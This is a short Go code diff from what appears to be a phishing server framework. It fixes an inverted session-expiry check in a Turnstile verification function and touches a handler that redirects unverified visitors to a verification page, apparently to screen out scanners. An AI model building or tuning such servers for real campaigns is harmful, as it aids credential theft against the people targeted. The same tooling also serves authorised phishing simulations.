@@ -165,7 +165,7 @@ func (ps *PhishingServer) verifyTurnstileSession(r *http.Request) bool{
 	if exists {
 		// token exists, now check if expiration date is not expired
 		log.Error("Session token exists! Expires at: ",session.expiry)
-		return session.expiry.Before(time.Now())
+		return session.expiry.After(time.Now())
 	}
 	return false
 }
@@ -288,6 +288,7 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 	switch {
 	case r.Method == "GET":
 		if !ps.verifyTurnstileSession(r) {
+
 			redirect := `<script>window.location.replace('https://` + r.Host + `/verify?sq=` + rid + `');</script>`
 			fmt.Fprint(w, fmt.Sprintf(redirect))
 		}
